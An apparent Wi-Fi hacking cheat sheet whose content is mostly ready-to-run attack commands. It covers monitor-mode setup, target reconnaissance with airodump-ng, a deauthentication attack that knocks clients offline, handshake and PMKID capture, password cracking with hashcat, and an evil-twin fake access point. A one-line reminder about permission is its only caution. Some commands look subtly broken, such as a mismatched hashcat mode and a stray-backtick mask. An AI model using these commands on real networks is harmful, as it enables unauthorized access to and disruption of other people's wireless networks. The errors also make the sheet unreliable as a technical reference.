---
layout: default
title: cheat_sheet_WiFi_Hacking
---

# 🧰 Wi-Fi Hacking Cheat Sheet

This cheat sheet covers essential Wi-Fi penetration testing techniques, including reconnaissance, handshake capture, and password cracking using `aircrack-ng`, `hcxtools`, and `hashcat`.

---

## 🔧 1. Interface Setup

### 🛑 Stop Network Services
```bash
sudo systemctl stop NetworkManager.service
sudo systemctl stop wpa_supplicant.service
```

### ▶️ Start Network Services
```bash
sudo systemctl start wpa_supplicant.service
sudo systemctl start NetworkManager.service
```

### 🛰️ Set Interface to Monitor Mode
```bash
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
```
> 💡 Replace `wlan0` with your actual network interface name (check with `ip a` or `iwconfig`).

---

## 🔍 2. Reconnaissance

### 🌐 Scan All Networks
```bash
sudo airodump-ng wlan0
```

### 🎯 Target Specific Access Point
```bash
sudo airodump-ng --bssid <BSSID> -c <CHANNEL> -w capture_file wlan0
```
> Replace `<BSSID>` with the AP's MAC address, and `<CHANNEL>` with the channel number.

---

## 💥 3. Capturing Handshakes

### ❌ Deauthentication Attack (Force Client Reconnect)
```bash
sudo aireplay-ng --deauth 10 -a <BSSID> wlan0 -c <CLIENT>
```

### 👻 Passive Capture Without Disconnecting Clients
```bash
sudo hcxdumptool -i wlan0 -w dumpfile.pcapng
```

---

## 🔄 4. Converting Capture Files

### 📦 From `.cap` to `.22000`
```bash
hcxpcapngtool -o wifi_hash.22000 -E essidlist.txt capture_file.cap
```

### 🧪 From `.pcapng` to `.22000`
```bash
hcxpcapngtool -o hash.22000 -E essidlist.txt dumpfile.pcapng
```

---

## 🔓 5. Cracking Passwords

### 📚 Using Dictionary Attack
```bash
hashcat -m 22000 -a 0 hash.22000 /path/to/wordlist.txt --force --show
```

### 🧮 Using Brute Force Attack
```bash
hashcat -m 22000 -a 3 hash.22000 ?d?d?l?u`!`$?d?d?d --force --show
```
> 🗂️ Replace `/path/to/wordlist.txt` with the actual path to your wordlist file.

---

## 🧠 6. Additional Attacks

### 🧬 PMKID Attack (WPA2/WPA3)
```bash
sudo hcxdumptool -i wlan0 -o pmkid.pcapng --enable_status 3
sudo hcxpcapngtool -o pmkid_hash.22000 pmkid.pcapng
hashcat -m 16800 pmkid_hash.22000 /path/to/wordlist.txt --force --show
```

### 👿 Evil Twin Attack (Fake Access Point)
```bash
sudo airbase-ng -e "FakeAP" -c <CHANNEL> wlan0
```

---

## 📎 Notes

- Make sure your wireless adapter supports monitor mode and packet injection.
- Consider using `airmon-ng check kill` before monitor mode if services interfere.
- Always run these commands responsibly, legally, and with permission.

---
